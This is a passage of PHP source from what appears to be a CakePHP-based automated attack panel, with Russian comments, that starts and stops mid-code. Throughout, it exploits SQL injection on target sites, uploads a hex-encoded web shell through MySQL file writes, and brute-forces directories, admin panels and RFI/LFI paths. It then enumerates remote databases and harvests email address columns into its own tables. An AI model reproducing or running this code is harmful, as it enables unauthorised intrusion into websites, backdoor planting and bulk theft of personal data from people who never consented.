		$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/dirs.txt';

		if (filesize($ff) < 2) {
			$this->d('finddirs начинаем искать директории');
			$this->finddirs($domen);

			if (file_get_contents($ff) == 'bad') {
				$this->default_dirs = true;
				$dirs = file($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/DEFAULT_DIRS');
			}
			 else {
				$dirs = file($ff);
			}
		}
		 else if (file_get_contents($ff) == 'bad') {
			$dirs = file($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/DEFAULT_DIRS');
		}
		 else {
			$dirs = file($ff);
		}

		if (file_get_contents($ff) == 'bad') {
			$this->default_dirs = true;
		}


		foreach ($dirs as $dir_one ) {
			if ($dir_one != '') {
				$dirs_clean[] = str_replace('http://' . $domen . '/', '', $dir_one);
			}

		}

		if (count($dirs_clean) == 0) {
			$dirs_clean = file($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/DEFAULT_DIRS');
		}


		$this->d($dirs_clean, 'dirs_clean ' . $domen);
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);

		foreach ($this->path as $path_one ) {
			$path_one = trim($path_one);

			foreach ($dirs_clean as $dirs_clean_one ) {
				$dirs_clean_one = trim($dirs_clean_one);
				$path_full[$dirs_clean_one] = $path_one . $dirs_clean_one;
			}
		}

		$this->d($path_full, ' path_full ' . $domen);
		$i = 0;

		foreach ($path_full as $one => $dir ) {
			$dir = trim($dir);
			$one = trim($one);
			$code = file_get_contents('upload_shell.txt');
			$code = $this->mysqlInj->strtohex($code);
			$code = trim($code);
			$path_file = $dir . 'thread3.php';
			$path_url = $domen . '/' . $one . 'thread3.php';
			$this->mysqlInj->upload_file($code, $path_file);
			$this->d($path_file, '$path_file');
			$this->d($path_url, '$path_url');
			$this->d($this->mysqlInj->file, '$this->mysqlInj->file');
			exit();

			if (preg_match('/Errcode: 2/i', $this->mysqlInj->file)) {
				$errcode2[] = $path_file;
			}


			if (preg_match('/Errcode: 13/i', $this->mysqlInj->file)) {
				$errcode13[] = $path_file;
			}


			if (preg_match('/already exists/i', $this->mysqlInj->file)) {
				$this->d('already exists');
				$path_file = $dir . '_thread.php';
				$path_url = $domen . '/' . $one . '_thread.php';
				$this->mysqlInj->upload_file($code, $path_file);
			}


			if ($this->default_dirs == true) {
				$chek = $this->findfile2($path_url);
			}
			 else {
				$chek = $this->findfile($path_url);
			}

			if ($this->shell_url != '') {
				$this->d($this->shell_url, 'shell залит GOOD');
				break;
			}


			++$i;

			if ($i == 50) {
				break;
			}

		}

		$this->d($errcode2, '$errcode2');
		$this->d($errcode13, '$errcode13');
	}

	public function check_shell($url)
	{
		$url = str_replace('http://', '', $url);
		$res = file_get_contents($url . '?g=1');

		if ($res == 200) {
			return 'good';
		}


		return 'bad';
	}

	public function findrfi($url = '')
	{
		$hal_admin = file($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/RFI');
		$domen = $url;
		$url = 'http://' . $url;

		foreach ($hal_admin as $val ) {
			$urls[] = $url . '/' . $val;
		}

		$cmh = curl_multi_init();
		$tasks = array();
		$i = 0;
		$count_urls = count($urls);
		$file = 'rfi.txt';
		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen);
		$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/' . $file;
		$fp = fopen($ff, 'w');
		$this->d($ff, 'ff');
		$i = 0;

		while ($i < $count_urls) {
			$this->workup();
			if (($i == 50) || (count($urls) == 0)) {
				break;
			}


			$urlnew = array_shift($urls);
			$ch = $this->streampars($urlnew);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			++$i;
		}

		$active = NULL;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		while ($mrc == CURLM_OK) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
						$url = array_search($ch, $tasks);
						$tasks[$url] = curl_multi_getcontent($ch);

						if (($status == 200) && preg_match('/unipampascanunipampa/i', $tasks[$url])) {
							echo '<a target=\'_blank\' href=\'' . $url . '\'>' . $url . ' - ' . $status . '</a><br>';
							$kuku = 'yes';
							$url = trim($url);
							fwrite($fp, $url . "\r\n");
						}


						flush();
						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (0 < count($urls)) {
							$urlnew = array_shift($urls);
							$ch = $this->streampars($urlnew);
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}

					}


					$this->workup();
				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}

		}

		fclose($fp);

		if ($kuku != 'yes') {
			$this->d('ne nashol RFI ');
		}


		curl_multi_close($cmh);
	}

	public function findlfi($url = '')
	{
		$hal_admin = file($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/LFI');
		$domen = $url;
		$url = 'http://' . $url;

		foreach ($hal_admin as $val ) {
			$urls[] = $url . '/' . $val;
		}

		$this->d($urls, 'zapusk poiska adminok');
		exit();
		$cmh = curl_multi_init();
		$tasks = array();
		$i = 0;
		$count_urls = count($urls);
		$file = 'lfi.txt';
		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen);
		$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/' . $file;
		$fp = fopen($ff, 'w');
		$this->d($ff, 'ff');
		$i = 0;

		while ($i < $count_urls) {
			$this->workup();
			if (($i == 50) || (count($urls) == 0)) {
				break;
			}


			$urlnew = array_shift($urls);
			$ch = $this->streampars($urlnew);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			++$i;
		}

		$active = NULL;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		while ($mrc == CURLM_OK) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
						$url = array_search($ch, $tasks);
						$tasks[$url] = curl_multi_getcontent($ch);
						if (($status == 200) || ($status == 403) || ($status == 302)) {
							echo '<a target=\'_blank\' href=\'' . $url . '\'>' . $url . ' - ' . $status . '</a><br>';
							$kuku = 'yes';
							$url = trim($url);
							fwrite($fp, $url . "\r\n");
						}


						flush();
						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (0 < count($urls)) {
							$urlnew = array_shift($urls);
							$ch = $this->streampars($urlnew);
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}

					}


					$this->workup();
				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}

		}

		fclose($fp);

		if ($kuku != 'yes') {
			$this->d('ne nashol lfi ');
		}


		curl_multi_close($cmh);
	}

	public function finddirs($url = '')
	{
		$hal_admin = file($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/DIRS');
		$domen = $url;
		$ip = gethostbyname($url);
		$ip = 'http://' . $ip;
		$url = 'http://' . $url;

		foreach ($hal_admin as $val ) {
			$urls[] = $url . '/' . $val;
			$urls[] = $ip . '/' . $val;
		}

		$cmh = curl_multi_init();
		$tasks = array();
		$i = 0;
		$count_urls = count($urls);
		$file = 'dirs.txt';
		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen);
		$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/' . $file;
		$fp = fopen($ff, 'w');
		$this->d($ff, 'ff');
		$i = 0;

		while ($i < $count_urls) {
			$this->workup();
			if (($i == 50) || (count($urls) == 0)) {
				break;
			}


			$urlnew = array_shift($urls);
			$ch = $this->streampars($urlnew);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			++$i;
		}

		$active = NULL;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		$i = 0;

		while ($mrc == CURLM_OK) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
						$url = array_search($ch, $tasks);
						$tasks[$url] = curl_multi_getcontent($ch);

						if ($status == 200) {
							echo '<a target=\'_blank\' href=\'' . $url . '\'>' . $url . ' - ' . $status . '</a><br>';
							$kuku = 'yes';
							$url = trim($url);
							fwrite($fp, $url . "\r\n");
							++$i;

							if ($i == 100) {
								$file = 'dirs.txt';
								$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/' . $file;
								$fp = fopen($ff, 'w');
								fwrite($fp, 'bad');
								$this->d('Сервер не просканировать всегда 200 отдает');
								return false;
							}

						}


						flush();
						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (0 < count($urls)) {
							$urlnew = array_shift($urls);
							$ch = $this->streampars($urlnew);
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}

					}


					$this->workup();
				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}

		}

		fclose($fp);

		if ($kuku != 'yes') {
			$this->d('ne nashol papok ');
		}


		curl_multi_close($cmh);
	}

	public function findfiles($url = '')
	{
		$hal_admin = file($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/FILES');
		$domen = $url;
		$ip = gethostbyname($url);
		$url = 'http://' . $url;
		$ip = 'http://' . $ip;

		foreach ($hal_admin as $val ) {
			$urls[] = $url . '/' . $val;
			$urls[] = $ip . '/' . $val;
		}

		$cmh = curl_multi_init();
		$tasks = array();
		$i = 0;
		$count_urls = count($urls);
		$file = 'files.txt';
		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen);
		$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/' . $file;
		$fp = fopen($ff, 'w');
		$this->d($ff, 'ff');
		$i = 0;

		while ($i < $count_urls) {
			$this->workup();
			if (($i == 50) || (count($urls) == 0)) {
				break;
			}


			$urlnew = array_shift($urls);
			$ch = $this->streampars($urlnew);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			++$i;
		}

		$active = NULL;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		while ($mrc == CURLM_OK) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
						$url = array_search($ch, $tasks);
						$tasks[$url] = curl_multi_getcontent($ch);
						if (($status == 200) || ($status == 403) || ($status == 302)) {
							echo '<a target=\'_blank\' href=\'' . $url . '\'>' . $url . ' - ' . $status . '</a><br>';
							$kuku = 'yes';
							$url = trim($url);
							fwrite($fp, $url . "\r\n");
						}


						flush();
						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (0 < count($urls)) {
							$urlnew = array_shift($urls);
							$ch = $this->streampars($urlnew);
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}

					}


					$this->workup();
				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}

		}

		if ($kuku != 'yes') {
			$this->d('ne nashol ФАЙЛЫ ');
		}


		curl_multi_close($cmh);
	}

	public function findadmin($url = '')
	{
		$domen = $url;
		$hal_admin = file($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/ADMIN');
		$ip = gethostbyname($url);
		$ip = 'http://' . $ip;
		$url = 'http://' . $url;

		foreach ($hal_admin as $val ) {
			$urls[] = $url . '/' . $val;
			$urls[] = $ip . '/' . $val;
		}

		$cmh = curl_multi_init();
		$tasks = array();
		$i = 0;
		$count_urls = count($urls);
		$file = 'adminpanel.txt';
		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen);
		$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/' . $file;
		$fp = fopen($ff, 'w');
		$this->d($ff, 'ff');
		$i = 0;

		while ($i < $count_urls) {
			$this->workup();
			if (($i == 50) || (count($urls) == 0)) {
				break;
			}


			$urlnew = array_shift($urls);
			$ch = $this->streampars($urlnew);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			++$i;
		}

		$active = NULL;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		while ($mrc == CURLM_OK) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
						$url = array_search($ch, $tasks);
						$tasks[$url] = curl_multi_getcontent($ch);
						if (($status == 200) || ($status == 403) || ($status == 302)) {
							echo '<a target=\'_blank\' href=\'' . $url . '\'>' . $url . ' - ' . $status . '</a><br>';
							$kuku = 'yes';
							$url = trim($url);
							fwrite($fp, $url . "\r\n");
						}


						flush();
						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (0 < count($urls)) {
							$urlnew = array_shift($urls);
							$ch = $this->streampars($urlnew);
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}

					}


					$this->workup();
				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}

		}

		if ($kuku != 'yes') {
			$this->d('ne nashol admonku ');
		}


		curl_multi_close($cmh);
	}

	public function findfile($url = '')
	{
		$domen = $url;
		$hal_admin = array();
		$hal_admin[] = $file;
		$url = str_replace('http://', '', $url);
		$url = 'http://' . $url;
		$urls[] = $url;
		$cmh = curl_multi_init();
		$tasks = array();
		$i = 0;
		$count_urls = count($urls);
		$i = 0;

		while ($i < $count_urls) {
			$this->workup();
			if (($i == 50) || (count($urls) == 0)) {
				break;
			}


			$urlnew = array_shift($urls);
			$ch = $this->streampars($urlnew);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			++$i;
		}

		$active = NULL;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		while ($mrc == CURLM_OK) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
						$url = array_search($ch, $tasks);
						$tasks[$url] = curl_multi_getcontent($ch);

						if ($status == 200) {
							$file = 'shell.txt';
							$this->shell_url = $url;
							echo '<a target=\'_blank\' href=\'' . $url . '\'>' . $url . ' - ' . $status . '</a><br>';
							$kuku = 'yes';
						}


						flush();
						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (0 < count($urls)) {
							$urlnew = array_shift($urls);
							$ch = $this->streampars($urlnew);
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}

					}


					$this->workup();
				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}

		}

		if ($kuku != 'yes') {
		}


		curl_multi_close($cmh);
	}

	public function findfile2($url = '')
	{
		if (file_get_contents($url . '?q=1') == 200) {
			$this->shell_url = $url;
			return 'good';
		}

	}

	public function oneinfo($url, $domen)
	{
		$this->d($url);
		$this->mysqlInj = new InjectorComponent();
		$this->proxyCheck();
		$urls = $this->mysqlInj->urlParseUrl($url);
		$this->d($urls, 'urls');

		foreach ($urls as $url2 ) {
			if (preg_match('/get::/i', $url2)) {
				$header = 'get';
			}
			 else if (preg_match('/post::/i', $url2)) {
				$header = 'post';
			}
			 else {
				$header = 'get';
			}

			$test = $this->mysqlInj->inject($url2);

			if ($test != false) {
				$this->url2 = $url2;
			}
			if ($test) {
				break;
			}

		}

		if ($test !== false) {
			$this->mysqlInj->mysqlGetUser();
			$this->d($this->mysqlInj->user, 'user');
			$this->mysqlInj->mysqlGetVersion();
			$data = $this->mysqlInj->load_file_priv();
			$v = substr($this->mysqlInj->version, 0, 1);
			$version = $this->mysqlInj->version;
			$this->d($version, 'version');

			if ($this->mysqlInj->sleep_metod == true) {
				$set1['tp'] = $this->mysqlInj->set['sleep']['flt']['tp'];
				$set1['qt'] = $this->mysqlInj->set['sleep']['flt']['qt'];
				$set1['sp'] = $this->mysqlInj->set['sleep']['flt']['sp'];
				$set1['ed'] = $this->mysqlInj->set['sleep']['flt']['ed'];
				$set1['an'] = $this->mysqlInj->set['sleep']['flt']['an'];
				$set1['nl'] = $this->mysqlInj->set['sleep']['flt']['nl'];
				$set1['sq'] = $this->mysqlInj->set['sleep']['flt']['sq'];
				$set1['sl'] = $this->mysqlInj->set['sleep']['flt']['sl'];
				$set1['scb'] = $this->mysqlInj->set['sleep']['scb'];
				$set1['coment'] = $this->mysqlInj->set['sleep']['coment'];
				$set1['outp'] = $this->mysqlInj->set['sleep']['outp'];
				$set1['hex'] = $this->mysqlInj->set['sleep']['hex'];
				$set1['key'] = $this->mysqlInj->ret['sleep']['key'];
				$set1['val'] = $this->mysqlInj->ret['sleep']['val'];
				$this->mysqlInj->sleep_data = serialize($set1);
			}
			 else {
				$this->mysqlInj->sleep_data = 0;
			}

			$url2 = $this->mysqlInj->url;
			$this->d($url2, '$url2222');
			$this->d($this->mysqlInj->method, '$this->mysqlInj->method');
			$this->d($this->mysqlInj->column, '$this->mysqlInj->column');
			$this->d($this->mysqlInj->sposob, '$this->mysqlInj->sposob');
			$this->d($this->mysqlInj->work, '$this->mysqlInj->work');
			$this->d($this->mysqlInj->user, '$this->mysqlInj->user');
			$this->d($data['file_priv'], '$data[file_priv]');
			$this->d($this->mysqlInj->sleep_data, '$this->sleep_data');
			$user = $this->mysqlInj->user;
			$method = $this->mysqlInj->method;
			$sposob = $this->mysqlInj->sposob;
			$column = $this->mysqlInj->column;
			$file_priv = $data['file_priv'];

			if ($file_priv == '') {
				$file_priv = 0;
			}


			$sleep = $this->mysqlInj->sleep_data;

			if ($method == 10) {
				$find = 'sleep_metod';
			}
			 else if ($method == 4) {
				$find = 'mysqGetValueByError';
			}
			 else if ($method == 6) {
				$find = 'mysqGetValueByErrorNewW';
			}
			 else if ($method == 5) {
				$find = 'mysqlOrderError';
			}
			 else {
				if (($method == 0) || ($method == '')) {
					$find = 'mysqlMovePerebor -- +';
				}
				 else if ($method == 1) {
					$find = 'mysqlMovePerebor +--+';
				}
				 else if ($method == 2) {
					$find = 'mysqlMovePerebor %27';
				}
				 else if ($method == 3) {
					$find = 'mysqlMovePerebor %22';
				}

			}

			$this->d($sleep, '$sleep');

			if ($this->mysqlInj->work == false) {
				$work = $this->mysqlInj->work;
			}
			 else {
				$str_work = '';
				$work = array_unique($this->mysqlInj->work);

				foreach ($work as $val ) {
					$str_work .= $val . ',';
				}

				$work = $str_work;
			}

			if ($this->mysqlInj->https == true) {
				$http = 'https';
			}
			 else {
				$http = 'http';
			}

			$tic = $this->getcy($domen);
			$date = date('Y-m-d h:i:s');
			$maska = $this->get_arg_url($url2);
			$gurl = str_replace('http://', '', $url2);
			$gurl = str_replace('https://', '', $url2);
			$url = str_replace('http://', '', $url2);
			$this->d('INSERT INTO `posts_one` ' . "\r\n\t\t\t" . '(`url`,`date`,`maska`,`domen`,`gurl`,`prohod`,`status`,`sposob`,`method`,`column`,`work`,`file_priv`,`sleep`,`tic`,`version`,`find`,`user`,`http`,`header`)' . "\r\n\t\t\t" . 'VALUES (\'' . $url . '\',\'' . $date . '\',\'' . $maska . '\',\'' . $domen . '\',\'' . $gurl . '\',5,3,\'' . $sposob . '\',\'' . $method . '\',\'' . $column . '\',\'' . $work . '\',\'' . $file_priv . '\',\'' . $sleep . '\',\'' . $tic . '\',\'' . $version . '\',\'' . $find . '\',\'' . $user . '\',\'' . $http . '\',\'' . $header . '\')');

			if ($this->Post->query('INSERT INTO `posts_one` ' . "\r\n\t\t\t" . '(`url`,`date`,`maska`,`domen`,`gurl`,`prohod`,`status`,`sposob`,`method`,`column`,`work`,`file_priv`,`sleep`,`tic`,`version`,`find`,`user`,`http`,`header`)' . "\r\n\t\t\t" . 'VALUES (\'' . $url . '\',\'' . $date . '\',\'' . $maska . '\',\'' . $domen . '\',\'' . $gurl . '\',5,3,\'' . $sposob . '\',\'' . $method . '\',\'' . $column . '\',\'' . $work . '\',\'' . $file_priv . '\',\'' . $sleep . '\',\'' . $tic . '\',\'' . $version . '\',\'' . $find . '\',\'' . $user . '\',\'' . $http . '\',\'' . $header . '\')')) {
				echo $domen . ' - Добавлен в обработку<br>';
			}
			 else {
				$this->d(mysql_error());
				echo $domen . ' - NO<br>';
			}

			return true;
		}


		return false;
	}

	public function krutaten_one($id, $load = '', $clear = 1)
	{
		$data = $this->Post->query('SELECT * FROM  `posts_one` WHERE `id`=' . $id);
		$data2 = $this->Post->query('SELECT * FROM  `m_users` WHERE `post_id`=' . $id);
		$data[0][100] = count($data2);

		if ($load == 'load') {
			if (isset($clear)) {
				$this->clearUrl();
				$this->Session->write('field', '');
				$this->Session->write('filed', '');
				$this->Session->write('getlimit', '');
				$this->Session->write('emails', '');
				$this->Session->write('getorder', '');
				$this->Session->write('getwhere', '');
				$this->Session->write('getdesc', '');
				$this->Session->write('getdesc', '');
				$this->mysqlInj = new InjectorComponent();
				$this->mysqlInj->desc_enable = true;
			}


			$this->Session->write('inject', $data[0]);
			$this->redirect(array('action' => 'krutaten_one/' . $id));
		}

	}

	public function getbd_one()
	{
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		$fieldcount = $this->Post->query('SELECT * FROM  `bds_one` WHERE  `post_id` =' . $squle['Post']['id']);
		$data = $this->Session->read('inject');
		unset($data['bds']);
		$this->Session->write('inject', $data);

		if (1000000 < count($fieldcount)) {
			$post_id = $data['posts_one']['id'];

			foreach ($fieldcount as $fff ) {
				$mailcount3 = '<span style=\'color:red; font-size:13px;font-weight:700;\'>' . $fff['bds_one']['count'] . '</span>';
				$ku_one = $fff['bds_one']['id'];
				$count = $ku_one = $fff['bds_one']['count'];
				$bd = $fff['bds_one']['bd'];
				$ttt = $fff['bds_one']['bd'] . '(' . $mailcount3 . ')';
				$tmp = '<a onclick=\'event.returnValue = false; return false;\' style=\'color:black\' href=\'/getTables_one/' . $bd . '\'>' . $ttt . '</a>';
				$data['bds'][$count] = $fff['bds_one']['bd'];
			}
		}


		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$bds = $this->mysqlInj->mysqlGetAllBd();
		$post_id = $squle['Post']['id'];
		$site = $squle['Post']['domen'];

		foreach ($bds as $bd ) {
			$fieldcount = $this->Post->query('SELECT * FROM  `bds_one` WHERE  `post_id` =\'' . $post_id . '\' AND `bd` = \'' . $bd . '\'');
			$bd_count = $this->mysqlInj->mysqlGetCountTablesBD($bd);
			$data2[$bd] = $bd_count;

			if (count($fieldcount) == 0) {
				if ($this->Post->query('INSERT INTO `bds_one` ' . "\r\n\t\t\t\t" . '(`post_id`,`bd`,`site`,`count`)' . "\r\n\t\t\t\t" . 'VALUES (' . $post_id . ',\'' . $bd . '\',\'' . $site . '\',' . $bd_count . ')')) {
				}

			}

		}

		$data['bds'] = $data2;
		$this->Session->write('inject', $data);
		$this->set('data', $data);
		$this->render('dataone');
	}

	public function getTables_one($bd)
	{
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$data2 = $this->mysqlInj->mysqlGetTablesByDd($bd);
		$data['tables'][$bd] = $data2;
		$this->Session->write('inject', $data);
		$this->set('data', $data);
		$this->render('dataone');
	}

	public function getField_one($bd, $table)
	{
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$data2 = $this->mysqlInj->mysqlGetFieldByTable($bd, $table);
		$data['field'][$bd][$table] = $data2;
		$this->Session->write('inject', $data);
		$this->set('data', $data);
		$this->render('dataone');
	}

	public function getcountmail_one($id)
	{
		ignore_user_abort(true);
		set_time_limit(0);
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		$this->workup();
		$this->Post->query('UPDATE `posts_one` SET `getmail`=1  WHERE `id`=' . $squle['Post']['id']);
		$fieldcount = $this->Post->query('SELECT * FROM  `fileds_one` WHERE  `post_id` =' . $squle['Post']['id']);

		if (0 < count($fieldcount)) {
			$post_id = $data['posts_one']['id'];
			echo '<a href=\'/posts/shlak_filed/' . $post_id . '\'>Удалить найденные мыла из кэша</a><br>';

			foreach ($fieldcount as $fff ) {
				$mailcount3 = '<span style=\'color:red; font-size:13px;font-weight:700;\'>' . $fff['fileds_one']['count'] . '</span>';
				$tmp = explode(':', $fff['fileds_one']['ipbase']);
				$ku_one = $fff['fileds_one']['id'];
				$ipbase2 = $tmp[0] . ':' . $tmp[1] . ':' . $tmp[2] . '(' . $mailcount3 . ')' . ':' . $tmp[3];
				$str = '<a target=\'_blank\' href=\'/posts/getFieldMails_one/' . $tmp[1] . '/' . $tmp[2] . '\'  style=\'color:red\'>Раскрыть</a>';
				$data['emails'][] = $ipbase2;
				echo $ipbase2 . ' - ' . $str . '<br>';
			}

			$this->Session->write('inject', $data);
			exit();
		}


		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
			$this->d($set, 'set');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$post_id = $squle['Post']['id'];
		$url2 = $squle['Post']['url'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$data3 = $this->mysqlInj->mysqlGetAllValue('information_schema', 'COLUMNS', array('COLUMN_NAME', 'TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `COLUMN_NAME` LIKE char(' . $this->charcher('%mail%') . ') AND ( `DATA_TYPE`=char(' . $this->charcher('char') . ') OR `DATA_TYPE`=char(' . $this->charcher('varchar') . ') OR `DATA_TYPE`=char(' . $this->charcher('text') . '))');

		if (0 < count($data3)) {
			$this->workup();
			$url = parse_url($squle['Post']['url']);
			$ip = gethostbyname($url['host']);
			$post_id = $data['posts_one']['id'];
			echo '<a href=\'/posts/shlak_filed/' . $post_id . '\'>Удалить найденные мыла из кэша</a><br>';

			foreach ($data3 as $mail ) {
				$mailcount = $this->mysqlInj->mysqlGetCountInsert($mail['TABLE_SCHEMA'], $mail['TABLE_NAME'], 'WHERE `' . $mail['COLUMN_NAME'] . '` LIKE char(' . $this->charcher('%@%') . ')');
				flush();

				if (intval($mailcount) !== 0) {
					if (1 < $mailcount) {
						$fieldcount = $this->Post->query('SELECT * FROM  `fileds_one` WHERE  `post_id` =\'' . $post_id . '\' AND `count` = ' . $mailcount);
						$this->d($fieldcount, 'fieldcount');
						$this->d($ip, 'ip');
						$this->d($mail['TABLE_SCHEMA'], 'TABLE_SCHEMA');
						$this->d($mail['TABLE_NAME'], 'TABLE_NAME');
						$this->d($mailcount, '$mailcount');
						$mailcount3 = '<span style=\'color:red; font-size:13px;font-weight:700;\'>' . $mailcount . '</span>';
						$ipbase2 = $ip . ':' . $mail['TABLE_SCHEMA'] . ':' . $mail['TABLE_NAME'] . '(' . $mailcount . ')' . ':' . $mail['COLUMN_NAME'];
						$ipbase3 = $ip . ':' . $mail['TABLE_SCHEMA'] . ':' . $mail['TABLE_NAME'] . '(' . $mailcount3 . ')' . ':' . $mail['COLUMN_NAME'];
						$data['emails'][] = $ipbase3;
						echo $ipbase3 . '<br>';

						if (count($fieldcount) == 0) {
							$ipbase = $ip . ':' . $mail['TABLE_SCHEMA'] . ':' . $mail['TABLE_NAME'] . ':' . $mail['COLUMN_NAME'];
							$table = $mail['TABLE_NAME'];
							$label = $mail['COLUMN_NAME'];
							$count = intval($mailcount);
							$site = $squle['Post']['url'];

							if ($this->Post->query('INSERT INTO `fileds_one` ' . "\r\n\t\t\t\t\t\t\t\t" . '(`post_id`,`ipbase`,`ipbase2`,`table`,`label`,`site`,`count`)' . "\r\n\t\t\t\t\t\t\t\t" . 'VALUES (' . $post_id . ',\'' . $ipbase . '\',\'' . $ipbase2 . '\',\'' . $table . '\',\'' . $label . '\',\'' . $url2 . '\',\'' . $count . '\')')) {
							}

						}

					}

				}

			}
		}


		$this->Session->write('inject', $data);
		$this->set('data', $data);
		$this->render('emailone');
		exit();
	}

	public function getcountmail_one_pass($id)
	{
